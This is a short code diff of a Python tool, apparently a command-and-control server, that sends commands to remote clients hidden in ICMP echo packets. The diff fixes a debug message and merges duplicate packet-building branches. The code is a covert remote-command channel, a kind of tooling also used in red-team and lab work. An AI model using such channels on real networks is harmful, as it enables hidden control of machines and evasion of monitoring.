@@ -81,7 +81,7 @@ def send_command(arguments, clients, execute):
             #  segments = len(clienttokens[1].encode('utf-8'))//1469
             # if DEVDEBUG: print(segments)
             send_over_icmp(clients.get(int(clienttokens[0])), clienttokens[1], execute)
-            if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))} (Super Secretly)")
+            if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))} (Super Secretly)")
             if DEBUG and not SuperSecretMode: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))}")
         else:
             print(f"[ERROR] No client at ID {clienttokens[0]}")
@@ -108,11 +108,8 @@ def send_over_icmp(clientip, command, execute):
             clientcommand = "!!!$0" + encrypted
         else:
             clientcommand = "!!!00" + command
-
-    if SuperSecretMode: 
-        evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
-    else:
-        evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
+            
+    evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
     send(evil)
 
 # Send command to all clients
